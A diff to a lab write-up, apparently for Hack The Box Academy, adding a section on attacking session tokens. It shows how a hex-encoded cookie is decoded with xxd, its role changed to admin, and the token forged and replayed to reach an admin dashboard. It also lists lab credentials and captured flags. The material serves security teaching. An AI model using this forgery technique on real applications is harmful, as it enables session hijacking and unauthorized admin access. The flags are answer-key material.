@@ -810,7 +810,6 @@ The scan reveals a valid administrator user ID:
 
 ```
 372
-
 ```
 
 ![Filtered output](images/parameter-mod4.PNG)
@@ -823,7 +822,7 @@ By modifying the request accordingly:
 
 ![Filtered output](images/parameter-mod5.PNG)
 
-We gain access to the administrative interface:
+We gain access to the administrative dashboard:
 
 ![Filtered output](images/parameter-mod6.PNG)
 
@@ -834,5 +833,101 @@ HTB{63593317426484ea6d270c2159335780}
 ```
 
 This confirms a successful **authentication and authorization bypass via parameter manipulation**.
+
+---
+
+## Attacking Session Tokens
+
+Authentication vulnerabilities can arise not only from flaws in the login mechanism itself, but also from **insecure handling of session tokens**. A session token is a unique identifier used by a web application to **associate HTTP requests with a specific user session**. If an attacker is able to obtain or predict a valid session token belonging to another user, they can impersonate that user and fully **hijack their session**.
+
+Session attacks are particularly dangerous because they often bypass authentication entirely.
+
+If a session token lacks sufficient entropy, it may be **brute-forced**, similar to weak password-reset tokens discussed earlier in the `Brute Forcing Password Reset Tokens` section.
+
+Consider the following example:
+
+```
+Set Cookie: session=a5fd
+```
+
+![Filtered output](images/session-attacks.PNG)
+
+A four-character session token provides an extremely small key space and can be brute-forced quickly, allowing an attacker to hijack arbitrary user sessions.
+
+In real-world applications, session tokens are typically longer. However, vulnerabilities still arise when tokens:
+
+- Contain predictable structures
+- Include hardcoded prefixes or suffixes
+- Encode sensitive data without integrity protection
+
+These weaknesses effectively reduce the entropy of the token or allow attackers to **forge valid session tokens**.
+
+We are provided with valid credentials:
+
+```
+htd-stdnt:AcademyStudent!
+```
+
+After authenticating and intercepting the response, we observe the following session cookie:
+
+```
+Set-Cookie: session=757365723d6874622d7374646e743b726f6c653d75736572
+```
+
+![Filtered output](images/session-attacks2.PNG)
+
+The session token appears long enough at first glance (49 characters). We verify its length:
+
+```bash
+echo "757365723d6874622d7374646e743b726f6c653d75736572" | wc -c
+```
+
+Despite its length, the token strongly resembles a **hexadecimal string**. Decoding it confirms this suspicion.
+
+We reverse the hexadecimal encoding using `xxd`:
+
+```bash
+echo "757365723d6874622d7374646e743b726f6c653d75736572" | xxd -r -p
+```
+
+The decoded value is:
+
+```
+user=htb-stdnt;role=user
+```
+
+This reveals that:
+
+- The session token directly stores user identity information
+- Role-based authorization is entirely client-controlled
+- No signing, hashing, or integrity verification is applied
+
+Since the application blindly trusts the session value, we can **forge a new token** by modifying the role:
+
+```bash
+echo "user=htb-stdnt;role=admin" | xxd -p
+```
+
+This produces the following forged session token:
+
+```
+757365723d6874622d7374646e743b726f6c653d61646d696e0a
+```
+
+We replace the session cookie in the intercepted request:
+
+```
+Cookie: session=757365723d6874622d7374646e743b726f6c653d61646d696e0a;
+```
+
+![Filtered output](images/session-attacks3.PNG)
+
+After forwarding the modified request, we gain access to the administrative dashboard. The flag is visible in the page source:
+
+```
+HTB{d1f5d760d130f7dd11de93f0b393abda}
+```
+
+This confirms a successful **session hijack via token forgery**.
 
 ---
